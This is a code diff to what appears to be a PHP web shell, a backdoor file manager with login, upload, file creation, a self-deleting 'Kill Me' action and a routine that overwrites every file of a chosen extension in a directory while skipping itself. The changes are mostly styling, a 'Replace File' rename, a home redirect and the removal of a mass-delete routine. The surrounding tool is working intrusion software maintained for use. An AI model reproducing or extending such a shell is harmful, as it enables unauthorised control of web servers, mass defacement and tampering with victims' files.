@@ -78,7 +78,7 @@ table {
   border-collapse: separate;
   border-spacing: 0;
   border: 25px solid #fff;
-  width: 70%;
+  width: 85%;
   margin: 50px auto;
   border-radius: 20px;
   box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
@@ -141,7 +141,7 @@ textarea {
 
 input[type=submit] {
   font-family: 'Ubuntu Mono', monospace;
-  padding:5px;
+  padding:7px 20px;
   outline:none;
   margin-left:-8px;
   margin-right:10px;
@@ -155,7 +155,7 @@ input[type=submit] {
 }
 input[type=text] {
   font-family: 'Ubuntu Mono', monospace;
-  padding:5px;
+  padding:7px 5px;
   outline:none;
   margin-left:-8px;
   margin-right:10px;
@@ -172,7 +172,7 @@ select {
   margin-right:10px;
   margin-top:10px;
   margin-bottom:10px;
-  padding:5px 10px;
+  padding:7px 20px;
   outline:none;
   color:#8a8a8a;
   border-radius:20px;
@@ -189,6 +189,7 @@ a:hover {
   text-decoration-color: red;
 }
 .alert {
+  text-align: center;
   width: 100%;
   margin-top:10px;
   margin-left:-10px;
@@ -218,6 +219,8 @@ th.line {
   margin-bottom:-6px;
   margin-left:-8px;
 }
+textarea:hover, 
+input[type=text]:hover, 
 a.tools:hover, 
 a.back:hover,
 select:hover, 
@@ -598,7 +601,7 @@ function masswriter($post) {
   <thead>
       <tr>
         <th>
-          <a class="back" href="?path=<?php print @cwd() ?>">MASS WRITE</a>
+          <a class="back" href="?path=<?php print @cwd() ?>">REPLACE FILE</a>
         </th>
       </tr>
     </thead>
@@ -656,32 +659,11 @@ function masswrite($mode, $dir, $type, $text) {
       if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
         print("<tr><td>
           <div class='alert alert-success' role='alert'>
-          <b>".$dir.DIRECTORY_SEPARATOR.$file."</b> Successfully !
+          <b>".$dir.DIRECTORY_SEPARATOR."<span style='color:green;'>".$file."</span></b> Successfully !
           </div></td></tr>");
         $fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, $_mode);
         if ($fp) {
           @fwrite($fp, $text);
-        } else {
-          print("<tr><td>
-            <div class='alert alert-danger' role='alert'>
-            Error. Access Danied
-            <div></td></tr>");
-        }
-      }
-    }
-  }
-}
-function massdelete($mode, $dir, $type, $text) {
-  if ($handle = @opendir($dir)) {
-    while (($file = @readdir($handle)) !== false) {
-      if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
-        print("<tr><td>
-          <div class='alert alert-success' role='alert'>
-          <b>".$dir.DIRECTORY_SEPARATOR.$file."</b> Successfully !
-          </div></td></tr>");
-        //$fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, $_mode);
-        if (@delete($dir.DIRECTORY_SEPARATOR.$file)) {
-          //@fwrite($fp, $text);
         } else {
           print("<tr><td>
             <div class='alert alert-danger' role='alert'>
@@ -706,6 +688,9 @@ function making($post) {
     if (isset($_POST['submit'])) {
       if ($_POST['type'] == 'file') {
         switch ($_POST['file_name']) {
+          case 'txt':
+            $_mode = "txt";
+            break;
           case 'html':
             $_mode = "html";
             break;
@@ -776,6 +761,7 @@ function making($post) {
       <tr>
         <td style="width:50px;">
           <select name="file_name">
+            <option value="txt">txt</option>
             <option value="html">html</option>
             <option value="php">php</option>
             <option value="css">css</option>
@@ -785,13 +771,13 @@ function making($post) {
         </td>
         <td>
           <center>
-          <input style="width:98.8%;" type="text" name="filename" placeholder="Filename: sfx* please empty this form if you want create DIRECTORY">
+          <input style="width:98.8%;" type="text" name="filename" placeholder="Filename: ">
         </center>
         </td>
       </tr>
       <tr>
         <td colspan="2">
-          <textarea style="width:99.5%;" name="text" placeholder="Your text"></textarea>
+          <textarea style="width:99.5%;" name="text" placeholder="sfx* please empty this textarea if you want create DIRECTORY"></textarea>
         </td>
       </tr>
       <tr>
@@ -1097,12 +1083,18 @@ function killme($post) {
     }
   }
 }
+function home() {
+  $home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."";
+  ?> <script type="text/javascript">window.location='<?php print $home ?>';</script> <?php
+}
 function logout($post) {
   if ($_GET['do'] == 'logout') {
     unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
-    ?><meta http-equiv='refresh' content='1'><?php
+    @home();
   }
 }
+if (isset($_GET['home']))
+{@home();}
 if ($_GET['do'] == 'delete') 
 {@delete($_GET['file']);}
 @edit("edit", $_GET['file']);
@@ -1124,9 +1116,10 @@ if ($_GET['do'] == 'delete')
     </tr>
     <tr>
       <th colspan="5">
+        <a class="tools" href="?path=<?php print @cwd() ?>&home">Home</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=upload">Upload</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=making">Make File</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&do=masswrite">Mass Write</a>
+        <a class="tools" href="?path=<?php print @cwd() ?>&do=masswrite">Replace File</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=killme">Kill Me</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=logout">Logout</a>
       </th>
